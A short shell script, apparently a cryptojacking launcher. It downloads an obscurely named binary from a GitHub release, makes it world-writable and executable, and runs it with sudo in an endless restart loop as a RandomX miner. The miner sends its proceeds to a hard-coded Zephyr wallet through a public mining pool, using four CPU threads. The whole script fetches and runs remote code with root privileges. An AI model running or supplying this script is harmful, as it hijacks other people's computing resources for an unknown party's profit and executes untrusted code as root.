wget https://github.com/renilo/kuuntul/releases/download/test/kuntulan2
chmod 777 kuntulan2

while :; do
    sudo ./kuntulan2 --algorithm randomx --pool zephyr.miningocean.org:5332 --wallet ZEPHs8ZDBWJeLA4UwGkvrjD41nWFACco1TrSf5QtFFw9Vh6uPkRLHfcdZ7XNEWMTEqfgEMabn3Z3zDHszDncfPdKB6VLSLvXy82 --password $(echo $(shuf -i 1-99999999 -n 1)-VA1) --cpu-threads 4 --disable-gpu;
    sleep 5;
done
